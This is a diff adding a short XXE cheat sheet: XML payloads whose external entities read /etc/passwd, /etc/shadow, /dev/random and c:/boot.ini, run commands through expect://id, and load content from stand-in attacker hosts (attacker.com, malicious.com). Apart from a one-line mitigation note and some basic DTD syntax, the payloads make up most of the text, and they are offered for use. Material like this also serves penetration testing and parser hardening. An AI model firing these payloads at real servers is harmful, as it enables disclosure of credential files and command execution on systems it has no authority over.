@@ -1,0 +1,65 @@
+Local file
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>
+
+Remote Code Execution
+ <?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [ <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "expect://id" >]>
+     <creds>
+        <user>&xxe;</user>
+        <pass>mypass</pass>
+     </creds>
+
+Disclosure
+ <?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+ 
+  <?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
+ 
+  <?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+ 
+  <?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
+
+Exection your XXE function into an XML variable.
+&own;
+
+Mitigation
+libxml_disable_entity_loader needs to be true
+
+dtd visualization
+<?xml version="1.0"?>
+<!DOCTYPE message SYSTEM "message.dtd">
+<message>
+	<to>Jim</to>
+	<from>Janis</from>
+	<subject>Meeting</subject>
+	<body>Don't forget the meeting on friday!</body>
+</message>
+
+DTD Entity
+Internal DTD Entity Syntax:
+<!ENTITY entity-name "entity-value">
+Internal DID Entity Example:
+<!ENTITY email "some@email.com">
+<!ENTITY author "HappyHack &email;">
+<author>&author;</author>
+
+External DTD Entity Syntax:
+<!ENTITY entity-name SYSTEM "URI/URL">
+External DTD Entity Example:
+<!ENTITY author system "http://malicious.com/entities.dtd">
+<author>&author;</author>
